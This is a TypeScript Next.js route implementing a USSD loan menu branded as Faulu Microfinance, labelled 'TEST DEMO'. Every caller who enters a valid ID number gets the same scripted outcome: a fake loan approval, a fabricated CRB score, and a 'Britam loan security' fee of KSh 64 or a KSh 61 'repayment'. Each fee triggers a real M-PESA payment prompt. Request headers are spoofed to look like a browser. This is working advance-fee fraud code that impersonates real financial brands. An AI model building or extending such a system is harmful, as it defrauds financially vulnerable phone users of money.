import { NextRequest, NextResponse } from "next/server";

import { sql } from "@/lib/db";


type OnfonPayload = {
  USERID?: string;
  MSISDN?: string;
  SESSION_ID?: string;
  SESSIONID?: string;
  USSD_STRING?: string;
  INPUT?: string;
  NEWREQUEST?: string;
  USSDCODE?: string;
};

// ---------------------------------------------------------------------------
// USSD response helper
// ---------------------------------------------------------------------------

function respond(msg: string, continueSession: boolean) {
  const prefix = continueSession ? "CON" : "END";

  return new NextResponse(`${prefix} ${msg}`, {
    status: 200,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
      Pragma: "no-cache",
      Expires: "0",
    },
  });
}

// ---------------------------------------------------------------------------
// Timeout helper
// ---------------------------------------------------------------------------

const runWithTimeout = <T>(
  promise: Promise<T>,
  ms: number
): Promise<T> => {
  return Promise.race([
    promise,
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error("Timeout")), ms)
    ),
  ]);
};

// ---------------------------------------------------------------------------
// Phone normalization
// ---------------------------------------------------------------------------

function normalizePhone(raw: string): string {
  const digits = raw.replace(/\D/g, "");

  if (digits.startsWith("254")) return digits;

  if (digits.startsWith("0")) {
    return "254" + digits.slice(1);
  }

  return "254" + digits;
}

// ---------------------------------------------------------------------------
// Main menu
// ---------------------------------------------------------------------------

function mainMenu() {
  return `TEST DEMO
Welcome to Faulu Microfinance
1. Check loan limit
2. Request Loan
3. Repay Loan
0. Exit`;
}

// ---------------------------------------------------------------------------
// UpesiPay route configuration
// Same environment variables as the existing endpoint.
// ---------------------------------------------------------------------------

async function getUpesiPayRouteDetails() {
  return {
    isMainAccount: true,
    username: process.env.UPESIPAY_API_USERNAME,
    password: process.env.UPESIPAY_API_PASSWORD,
    channel: process.env.UPESIPAY_CHANNEL_ID || "wallet",
  };
}

// ---------------------------------------------------------------------------
// UpesiPay STK Push
// Same gateway and request structure as the existing endpoint.
// ---------------------------------------------------------------------------

async function initiateStkPush(
  phone: string,
  amount: number,
  callbackUrl: string
) {
  const route = await getUpesiPayRouteDetails();

  const authToken = Buffer.from(
    `${route.username}:${route.password}`
  ).toString("base64");

  const channel = route.channel;

  const appUrl =
    process.env.APP_URL || "https://vercel.app";

  try {
    const res = await fetch(
      "https://upesipay.com/api/v2/collections/initiate/",
      {
        method: "POST",

        headers: {
          Authorization: `Basic ${authToken}`,
          "Content-Type": "application/json",
          Accept: "application/json",
          Referer: appUrl,
          Origin: appUrl,
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },

        body: JSON.stringify({
          channel_id:
            channel === "wallet" ? "wallet" : channel,

          phone_number: phone,

          amount: Math.floor(Number(amount)),

          callback_url: callbackUrl,
        }),
      }
    );

    const text = await res.text();

    console.log(
      "Faulu TEST DEMO UpesiPay STK response:",
      text
    );

    let parsedData: any = {};

    try {
      parsedData = text ? JSON.parse(text) : {};
    } catch {
      parsedData = {};
    }

    const checkoutId =
      parsedData.checkout_request_id ||
      parsedData.data?.checkout_request_id ||
      parsedData.checkout_id;

    const merchantId =
      parsedData.merchant_request_id ||
      parsedData.data?.merchant_request_id ||
      parsedData.merchant_id;

    const hasSucceeded =
      res.ok &&
      (
        parsedData.success === true ||
        parsedData.status === "success" ||
        !!checkoutId
      );

    return {
      ok: hasSucceeded,
      isMainAccount: route.isMainAccount,
      checkoutId: checkoutId || null,
      merchantId: merchantId || null,
      message: parsedData.message || null,
    };

  } catch (err) {

    console.error(
      "Faulu TEST DEMO STK request error:",
      err
    );

    return {
      ok: false,
      isMainAccount: route.isMainAccount,
      checkoutId: null,
      merchantId: null,
      message: "Network connection breakdown",
    };
  }
}

// ---------------------------------------------------------------------------
// Record successful payment request
// ---------------------------------------------------------------------------

async function recordOrder(
  phone: string,
  sessionId: string,
  packageSize: string,
  amount: number,
  result: {
    checkoutId: string | null;
    merchantId: string | null;
  }
) {
  try {

    await runWithTimeout(
      sql`
        INSERT INTO orders
        (
          phone_number,
          session_id,
          package_size,
          quantity,
          unit_price,
          total_amount,
          status,
          checkout_request_id,
          merchant_request_id
        )
        VALUES
        (
          ${phone},
          ${sessionId},
          ${packageSize},
          1,
          ${amount},
          ${amount},
          'awaiting_payment',
          ${result.checkoutId},
          ${result.merchantId}
        )
      `,
      1200
    );

  } catch (err) {

    console.error(
      "Could not record test demo order:",
      err
    );
  }
}

// ---------------------------------------------------------------------------
// POST - Onfon USSD endpoint
// ---------------------------------------------------------------------------

export async function POST(req: NextRequest) {

  let payload: OnfonPayload;

  const rawBody = await req.text();

  try {

    payload = JSON.parse(rawBody);

  } catch {

    payload = Object.fromEntries(
      new URLSearchParams(rawBody).entries()
    );

  }

  const rawPhone =
    (payload.MSISDN || "").trim();

  const sessionId =
    payload.SESSION_ID ||
    payload.SESSIONID ||
    "";

  const rawInput =
    (
      payload.USSD_STRING ||
      payload.INPUT ||
      ""
    ).trim();

  if (!rawPhone) {
    return respond(
      "TEST DEMO\nSorry, something went wrong.",
      false
    );
  }

  const phone = normalizePhone(rawPhone);

  // -------------------------------------------------------------------------
  // TEST MODE SAFETY SWITCH
  // -------------------------------------------------------------------------

  const testMode =
    process.env.FAULU_TEST_MODE === "true";

  if (!testMode) {

    return respond(
      "TEST DEMO\nService is currently unavailable.",
      false
    );

  }

  try {

    // -----------------------------------------------------------------------
    // New session
    // -----------------------------------------------------------------------

    let isNewSession = true;

    if (sessionId) {

      try {

        const res = await runWithTimeout(

          sql`
            INSERT INTO ussd_sessions (session_id)
            VALUES (${sessionId})
            ON CONFLICT (session_id) DO NOTHING
          `,

          1000

        );

        isNewSession =
          (res.rowCount ?? 0) > 0;

      } catch {

        isNewSession = true;

      }
    }

    // -----------------------------------------------------------------------
    // First screen
    // -----------------------------------------------------------------------

    // SCREEN 1: Fresh Session or Empty String
  if (isNewSession || rawInput === "") {
    return respond(`Welcome to Faulu Microfinance\nEnter your National ID Number\nto continue:`, true);
  }

    // -----------------------------------------------------------------------
    // Split accumulated Onfon input
    //
    // Example:
    //
    // 12345678
    // 12345678*1
    // 12345678*2*1
    // 12345678*2*1*1
    // -----------------------------------------------------------------------

    const segments =
      rawInput
        .split("*")
        .map((s) => s.trim());

    const choice =
      segments[segments.length - 1];

    // National ID
    const nationalId =
      segments[0] || "";

    // -----------------------------------------------------------------------
    // SCREEN 2
    // National ID -> Main menu
    // -----------------------------------------------------------------------

    if (segments.length === 1) {

      if (!/^\d{7,9}$/.test(nationalId)) {

        return respond(
          `Welcome to Faulu Microfinance
Invalid National ID Number.
Please enter your National ID Number:`,
          true
        );

      }

      return respond(
        mainMenu(),
        true
      );

    }

    // -----------------------------------------------------------------------
    // SCREEN 3
    // Main menu
    // -----------------------------------------------------------------------

    if (segments.length === 2) {

      // Exit
      if (choice === "0") {

        return respond(
          "Thank you for using Faulu Microfinance.",
          false
        );

      }

      // ---------------------------------------------------------------------
      // 1. Check loan limit
      // ---------------------------------------------------------------------

      if (choice === "1") {

        return respond(
          `Congratulations!
You qualify for a KSh 38,500 loan.
Fast, safe & flexible.
1. Continue
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // 2. Request Loan
      // ---------------------------------------------------------------------

      if (choice === "2") {

        return respond(
          `Select Loan Period:
1. Salary Loan
2. Biashara Loan
3. Emergency Loan
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // 3. Repay Loan
      // ---------------------------------------------------------------------

      if (choice === "3") {

        return respond(
          `Repay KSh61/month & qualify
for a 4x loan after 1 month.
e.g. Repay KSh1,000 = Loan KSh4,000
1. Pay KSh61 via M-PESA
0. Back`,
          true
        );

      }

      return respond(
        "Invalid choice. Please select 1, 2, 3 or 0.",
        true
      );
    }

    // -----------------------------------------------------------------------
    // SCREEN 4
    //
    // Check loan limit:
    // ID*1*1
    //
    // Request loan:
    // ID*2*1
    // ID*2*2
    // ID*2*3
    //
    // Repayment:
    // ID*3*1
    // -----------------------------------------------------------------------

    if (segments.length === 3) {

      const mainChoice =
        segments[1];

      // ---------------------------------------------------------------------
      // Check loan limit -> Continue
      // ---------------------------------------------------------------------

      if (
        mainChoice === "1" &&
        choice === "1"
      ) {

        return respond(
          `Your CRB score is 504 (Risky Loan)
due to your other ongoing loans.
We partner with Britam to provide secured
loans.

1. Check your secured loan offer
0. Cancel`,
          true
        );

      }

      // Back from Check Loan Limit
      if (
        mainChoice === "1" &&
        choice === "0"
      ) {

        return respond(
          mainMenu(),
          true
        );

      }

      // ---------------------------------------------------------------------
      // Request Loan -> Salary
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "1"
      ) {

        return respond(
          `Salary Loan: KSh 38,500
Repay KSh 39,400 Interest KSh900
1. Continue
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // Request Loan -> Biashara
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "2"
      ) {

        return respond(
          `Biashara Loan: KSh 38,500
Repay KSh 39,400 Interest KSh900
1. Continue
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // Request Loan -> Emergency
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "3"
      ) {

        return respond(
          `Emergency Loan: KSh 38,500
Repay KSh 39,400 Interest KSh900
1. Continue
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // Back from loan-period menu
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "0"
      ) {

        return respond(
          mainMenu(),
          true
        );

      }

      // ---------------------------------------------------------------------
      // REPAY LOAN -> KSh61 STK
      // ---------------------------------------------------------------------

      if (
        mainChoice === "3" &&
        choice === "1"
      ) {

        const appUrl =
          process.env.APP_URL ||
          "https://vercel.app";

        const callbackUrl =
          `${appUrl}/api/payment-callback`;

        const result =
          await initiateStkPush(
            phone,
            61,
            callbackUrl
          );

        if (
          !result.ok ||
          !result.checkoutId
        ) {

          console.error(
            "KSh61 repayment STK failed:",
            result.message
          );

          return respond(
            `Sorry, ${
              result.message ||
              "Could not send payment prompt."
            }
Please try again shortly.`,
            false
          );

        }

        await recordOrder(
          phone,
          sessionId,
          "FAULU_TEST_REPAYMENT",
          61,
          result
        );

        return respond(
          `Safaricom Message

An M-PESA prompt of KSh61 will appear
shortly.
Enter your PIN to complete your Repayment.`,
          false
        );

      }

      // Back from repayment
      if (
        mainChoice === "3" &&
        choice === "0"
      ) {

        return respond(
          mainMenu(),
          true
        );

      }

      return respond(
        "Invalid choice.",
        true
      );

    }

    // -----------------------------------------------------------------------
    // SCREEN 5
    //
    // Loan type -> Continue
    //
    // ID*2*1*1
    // ID*2*2*1
    // ID*2*3*1
    // -----------------------------------------------------------------------

    if (segments.length === 4) {

      const mainChoice =
        segments[1];

      const loanChoice =
        segments[2];

      // ---------------------------------------------------------------------
      // Back to loan-period menu
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "0"
      ) {

        return respond(
          `Select Loan Period:
1. Salary Loan
2. Biashara Loan
3. Emergency Loan
0. Back`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // Selected loan -> CRB screen
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        (
          loanChoice === "1" ||
          loanChoice === "2" ||
          loanChoice === "3"
        ) &&
        choice === "1"
      ) {

        return respond(
          `Your CRB score is 504 (Risky Loan)
due to your other ongoing loans.
We partner with Britam to provide secured
loans.

1. Check your secured loan offer
0. Cancel`,
          true
        );

      }

      return respond(
        "Invalid choice.",
        true
      );

    }

    // -----------------------------------------------------------------------
    // SCREEN 6
    //
    // Check secured loan offer
    //
    // ID*1*1*1
    //
    // Selected loan:
    //
    // ID*2*1*1*1
    // ID*2*2*1*1
    // ID*2*3*1*1
    // -----------------------------------------------------------------------

    if (segments.length === 5) {

      const mainChoice =
        segments[1];

      // ---------------------------------------------------------------------
      // Check Loan Limit -> Secured Loan Offer
      // ---------------------------------------------------------------------

      if (
        mainChoice === "1" &&
        choice === "1"
      ) {

        return respond(
          `Congratulations! Your Ksh 22,500 secured loan
has been approved.
Britam charges KSh 64 for loan security
1. Complete fee to release to your M-PESA
0. Cancel`,
          true
        );

      }

      // ---------------------------------------------------------------------
      // Request Loan -> Secured Loan Offer
      // ---------------------------------------------------------------------

      if (
        mainChoice === "2" &&
        choice === "1"
      ) {

        return respond(
          `Congratulations! Your Ksh 22,500 secured loan
has been approved.
Britam charges KSh 64 for loan security
1. Complete fee to release to your M-PESA
0. Cancel`,
          true
        );

      }

      return respond(
        "Invalid choice. Please select 1 or 0.",
        true
      );

    }

    // -----------------------------------------------------------------------
    // SCREEN 7
    //
    // Final secured-loan payment.
    //
    // ID*1*1*1*1
    //
    // OR
    //
    // ID*2*1*1*1*1
    // ID*2*2*1*1*1
    // ID*2*3*1*1*1
    // -----------------------------------------------------------------------

    if (segments.length === 6) {

      const mainChoice =
        segments[1];

      if (
        (
          mainChoice === "1" ||
          mainChoice === "2"
        ) &&
        choice === "1"
      ) {

        const appUrl =
          process.env.APP_URL ||
          "https://vercel.app";

        const callbackUrl =
          `${appUrl}/api/payment-callback`;

        // -------------------------------------------------------------------
        // KSh64 secured-loan test payment
        // -------------------------------------------------------------------

        const result =
          await initiateStkPush(
            phone,
            64,
            callbackUrl
          );

        if (
          !result.ok ||
          !result.checkoutId
        ) {

          console.error(
            "KSh64 secured loan STK failed:",
            result.message
          );

          return respond(
            `Sorry, ${
              result.message ||
              "Could not send payment prompt."
            }
Please try again shortly.`,
            false
          );

        }

        await recordOrder(
          phone,
          sessionId,
          "FAULU_TEST_SECURITY",
          64,
          result
        );

        return respond(
          `Safaricom Message

An M-PESA prompt of KSh64 will appear
shortly.
Enter your PIN to release your KSh 22,500 loan.`,
          false
        );

      }

      return respond(
        "Invalid choice. Please select 1 or 0.",
        true
      );

    }

    return respond(
      "Invalid request. Please try again.",
      false
    );

  } catch (err) {

    console.error(
      "Faulu TEST DEMO USSD error:",
      err
    );

    return respond(
      "Sorry, something went wrong.",
      false
    );

  }
}

// ---------------------------------------------------------------------------
// Health check
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// NEW UPDATED GET HANDLER FOR ONFON MEDIA 
// ---------------------------------------------------------------------------
export async function GET() {
  return new NextResponse("Service operational", {
    status: 200,
    headers: { "Content-Type": "text/plain; charset=utf-8" }
  });
}
